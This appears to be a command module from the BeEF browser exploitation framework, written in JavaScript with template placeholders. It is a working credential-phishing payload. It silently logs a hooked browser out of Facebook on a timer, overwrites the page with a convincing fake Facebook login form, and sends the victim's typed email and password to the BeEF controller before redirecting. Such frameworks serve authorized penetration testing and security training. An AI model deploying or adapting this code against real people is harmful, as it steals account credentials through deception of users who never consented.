//
// Copyright (c) 2006-2025Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - https://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

function logoutFacebook() {
	var img = document.createElement("IMG");
	img.src = "https://www.facebook.com/logout.php";
	img.height = "1px";
	img.width = "1px";
	img.style.visibility = "hidden";
	document.body.appendChild(img);
	//set a new setTimeout to redo the logout
	setTimeout('logoutFacebook()', <%= @logout_facebook_interval %>);
}

beef.execute(function() {
	document.title = "Facebook - Log In or Sign Up";
	beef.browser.changeFavicon("https://static.xx.fbcdn.net/rsrc.php/yo/r/iRmz9lCMBD2.ico");
	logoutFacebook();
    displayPhishingSite();
});

function clickedSubmitButton(){
    var credentials = "Username: "+document.getElementById('email').value+" Password: "+document.getElementById('pass').value;
    beef.net.send("<%= @command_url %>", <%= @command_id %>, "result="+credentials);
    //Timeout needed because otherwise the beef panel doesn't get the credentials in time
    setTimeout("redirect()", <%= @wait_seconds_before_redirect %>);
}
function redirect(){
    var theXssUrl = "<%== @xss_hook_url %>";
    if(theXssUrl && theXssUrl !== ""){
        window.location = theXssUrl;
    } else {
        window.location = "https://www.facebook.com/";
    }
}

function displayPhishingSite(){
    var zztop = beef.dom.getHighestZindex()+1;
    beef.dom.removeStylesheets();
    document.body.innerHTML = "<!DOCTYPE html><html lang='en'><head><meta charset='utf-8'><title>Facebook – log in or sign up</title><meta name='viewport' content='width=device-width, initial-scale=1'><link rel='icon' href='https://static.xx.fbcdn.net/rsrc.php/yo/r/iRmz9lCMBD2.ico'><style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:SFProText-Regular,Helvetica,Arial,sans-serif;background:#f0f2f5;color:#1c1e21;direction:ltr}._9q9_{display:flex;flex-direction:column;min-height:100vh}._8esf{flex:1;padding:20px 0}._8esg{display:flex;justify-content:space-between;width:980px;margin:0 auto}._8esh{padding:112px 0 0}._8esh h1{color:#1877f2;font-size:60px;font-weight:bold;line-height:1;margin:0 0 16px;font-family:SFProDisplay-Regular,Helvetica,Arial,sans-serif}._8esh h2{font-size:28px;font-weight:normal;line-height:32px;width:500px}._8esi{width:396px}._8esj{background:#fff;border-radius:8px;box-shadow:0 2px 4px rgba(0,0,0,.1),0 8px 16px rgba(0,0,0,.1);padding:20px}._8esk{margin-bottom:20px}._8esl{width:100%;padding:14px 16px;margin:0 0 12px;font-size:17px;line-height:16px;border:1px solid #dddfe2;border-radius:6px;color:#1d2129;background:#fff}._8esl:focus{border-color:#1877f2;box-shadow:0 0 0 2px #e7f3ff;outline:none}._8esl::placeholder{color:#90949c}._8esm{background:#1877f2;border:none;border-radius:6px;color:#fff;font-size:20px;font-weight:bold;line-height:48px;padding:0;width:100%;cursor:pointer;margin:6px 0 0;text-align:center}._8esm:hover{background:#166fe5}._8esn{text-align:center;margin:16px 0}._8esn a{color:#1877f2;font-size:14px;text-decoration:none}._8esn a:hover{text-decoration:underline}._8eso{display:flex;align-items:center;margin:20px 16px;text-align:center}._8esp{flex:1;height:1px;background:#dadde1}._8esq{margin:0 20px;color:#606770;font-size:14px;font-weight:500}._8esr{text-align:center}._8ess{background:#42b72a;border:none;border-radius:6px;color:#fff;font-size:17px;font-weight:bold;line-height:48px;padding:0 16px;cursor:pointer;text-decoration:none;display:inline-block}._8ess:hover{background:#36a420;text-decoration:none;color:#fff}._8est{text-align:center;margin:28px 0 0;font-size:14px}._8est a{color:#1c1e21;font-weight:600;text-decoration:none}._8est a:hover{text-decoration:underline}._8esu{background:#fff;border-top:1px solid #dadde1;padding:20px 0;margin-top:40px}._8esv{text-align:center;font-size:14px;color:#737373}._8esv a{color:#737373;text-decoration:none;margin:0 12px}._8esv a:hover{text-decoration:underline}._8esw{color:#737373;margin:8px 0 0;font-size:11px}@media (max-width:1040px){._8esg{width:100%;padding:0 20px;justify-content:center;flex-direction:column;align-items:center}._8esh{padding:0 0 40px;text-align:center}._8esh h1{font-size:40px}._8esh h2{font-size:20px;width:auto}}</style></head><body><div class='_9q9_'><div class='_8esf'><div class='_8esg'><div class='_8esh'><h1>facebook</h1><h2>Connect with friends and the world around you on Facebook.</h2></div><div class='_8esi'><div class='_8esj'><form onsubmit='clickedSubmitButton(); return false;'><div class='_8esk'><input type='text' class='_8esl' placeholder='Email or phone number' id='email' name='email' autocomplete='username' required></div><div class='_8esk'><input type='password' class='_8esl' placeholder='Password' id='pass' name='pass' autocomplete='current-password' required></div><div class='_8esk'><button type='submit' class='_8esm'>Log In</button></div></form><div class='_8esn'><a href='https://www.facebook.com/recover/initiate/?ars=facebook_login'>Forgotten password?</a></div><div class='_8eso'><div class='_8esp'></div><div class='_8esq'>or</div><div class='_8esp'></div></div><div class='_8esr'><a href='https://www.facebook.com/r.php' class='_8ess'>Create New Account</a></div></div><div class='_8est'><a href='https://www.facebook.com/pages/create/?ref_type=registration_form'>Create a Page</a> for a celebrity, brand or business.</div></div></div></div><div class='_8esu'><div class='_8esv'><a href='#'>English (US)</a><a href='#'>Español</a><a href='#'>Français (France)</a><a href='#'>中文(简体)</a><a href='#'>العربية</a><a href='#'>Português (Brasil)</a><a href='#'>한국어</a><a href='#'>Italiano</a><a href='#'>Deutsch</a><a href='#'>हिन्दी</a><div class='_8esw'>Facebook © 2025</div></div></div></div></body></html>";
}
